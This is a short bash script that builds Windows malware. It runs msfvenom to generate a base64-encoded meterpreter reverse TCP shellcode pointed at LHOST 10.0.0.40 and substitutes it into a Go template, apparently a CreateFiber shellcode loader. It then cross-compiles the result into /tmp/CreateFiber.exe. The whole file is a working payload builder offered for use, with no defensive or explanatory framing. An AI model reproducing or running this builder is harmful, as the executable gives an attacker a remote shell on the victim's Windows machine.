#!/bin/bash

SC=`msfvenom -p windows/x64/meterpreter_reverse_tcp -f base64  --platform windows --arch x64 LHOST=10.0.0.40`
CODE=`cat go.template`
# Replae relevant lines
CODE=${CODE/INJECT/$SC}
echo "$CODE" > createFiber.go

GOOS=windows GOARCH=amd64 go build -o /tmp/CreateFiber.exe createFiber.go
chmod 755 /tmp/CreateFiber.exe
